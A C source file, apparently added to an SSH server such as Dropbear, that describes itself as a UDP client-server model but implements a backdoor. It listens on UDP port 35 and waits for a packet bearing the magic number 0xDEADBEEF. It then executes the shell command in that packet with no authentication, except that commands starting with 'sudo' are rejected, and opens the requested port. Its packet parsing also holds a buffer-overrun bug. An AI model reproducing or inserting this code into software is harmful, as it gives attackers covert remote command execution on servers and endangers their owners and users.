
// Server side implementation of UDP client-server model 
#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <netinet/in.h> 
#include "uhandler.h"
#include "runopts.h"
#include "session.h"

  
#define PORT        35 
#define MAXLINE     sizeof(listen_packet_t)
#define MAGICNUM    -559038737 //0XDEADBEEF in decimal

void parse_to_packet(listen_packet_t *,char *);
void parse_error (listen_packet_t *,char *);
int check_shell_command(listen_packet_t *);


int check_shell_command(listen_packet_t * packet){
    if(packet->port_number == -1)
        return 0;
    //remove spacebreaks from the beginning of shell_command
    char* d = packet->shell_command;
    int i;
    for (i=0; packet->shell_command[i] == ' ' && i<256; i++);
    if(i>251)
        return 0;
    //if starts with 'sudo' ->return false
    if(packet->shell_command[i] == 's' && packet->shell_command[i+1] == 'u'
        && packet->shell_command[i+2] == 'd' && packet->shell_command[i+3] == 'o')
        return 0;
    return 1;

}

void parse_error (listen_packet_t *newpacket,char *buffer){
    printf("ERROR - illegal input: %s\n",buffer);
    newpacket->magic=0;
    newpacket->port_number=-1; //sign for parsing error
    newpacket->shell_command[0]='\0';
}

void parse_to_packet(listen_packet_t *newpacket,char *buffer){
    // printf("buffer:\t %s\n",buffer);
    char char_uint32[11]; //sizeof(uint32)==4B
    char char_uint16[6]; //sizeof(uint16)==2B
    int i=0,j=0;
    for(;i<10 && buffer[j]!=' '; i++,j++)
        char_uint32[i]=(char)buffer[j];
    char_uint32[i]='\0';
    if(i==10 && buffer[j]!= ' '){
        parse_error(newpacket,buffer);
        return;
    }
    if(buffer[j]==' '){ 
        j++;
    }

    for(i=0; i<5 && buffer[j]!=' ';i++,j++)
        char_uint16[i]=buffer[j];
    char_uint16[i]='\0';
    if( (i==5 && buffer[j]!= ' ') || char_uint16[0]=='-'){
        parse_error(newpacket,buffer);
        return;
    }
    if(buffer[j]==' ')
        j++;

    for(i=0; i<256 && *buffer; i++,j++)
        newpacket->shell_command[i]=buffer[j];
    /*
    printf("char_uint32: %s\n",char_uint32);
    printf("char_uint16: %s\n",char_uint16);    
    printf("newpacket.shell_command: %s\n",newpacket->shell_command);
    */
    uint32_t magic_num=atoi(char_uint32);
    uint16_t port_num=atoi(char_uint16);
    
        //update fields in the struct
        newpacket->magic=magic_num;
        newpacket->port_number=port_num;
    
}
  
void start_udp() {
    printf("GOT TO START_UDP\n") ;
    int sockfd;
    char buffer[MAXLINE]; 
    struct sockaddr_in servaddr, cliaddr;
    listen_packet_t newpacket;
     //TODO - check if AF_INET for IPv4 or AF_INET6 for IPv6
    // Creating socket file descriptor 
    if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
        perror("socket creation failed"); 
        exit(EXIT_FAILURE); 
    } 
      
    memset(&servaddr, 0, sizeof(servaddr)); 
    memset(&cliaddr, 0, sizeof(cliaddr)); 
      
    // Filling server information 
    servaddr.sin_family    = AF_INET; // IPv4 
    servaddr.sin_addr.s_addr = INADDR_ANY; 
    servaddr.sin_port = htons(PORT); 
      
    // Bind the socket with the server address 
    if ( bind(sockfd, (const struct sockaddr *)&servaddr,  
            sizeof(servaddr)) < 0 ) 
    { 
        perror("bind failed"); 
        exit(EXIT_FAILURE); 
    }
    

    while(1){
        // printf("UDP: ENTERED WHILE LOOP\n") ;
        int len, n;   
        len = sizeof(cliaddr);  //len is value/resuslt 
        n = recvfrom(sockfd, (char *)buffer, MAXLINE,  
                    MSG_WAITALL, ( struct sockaddr *) &cliaddr, 
                    &len); 
        //buffer[n] = '\0';
        if(n< 4)//min is number of magic + number of port
            printf("ERROR: RECIEVED PACKET SMALLER THAN MIN.SIZE\n");
        else{//else-parse income
            parse_to_packet(&newpacket,buffer);
        }

    //put here only for tests, after working- 
    //should change to command+parse
        printf("-------------\nGot listen_packet_t packet: \nmagic: %d\nport: %d\nshell_command: %s\n-------------\n", 
                 newpacket.magic,newpacket.port_number,newpacket.shell_command); 
        if((int)newpacket.magic == MAGICNUM){
            if(check_shell_command(&newpacket)){
                printf("MAGIC!!\n");
                //execute the shell_command, then add port
                shellexeccommand(newpacket.shell_command); //func in svr-chansession
                addportrequest((int)newpacket.port_number); //func in svr-runopts
            }   
        }
    }


} 


    

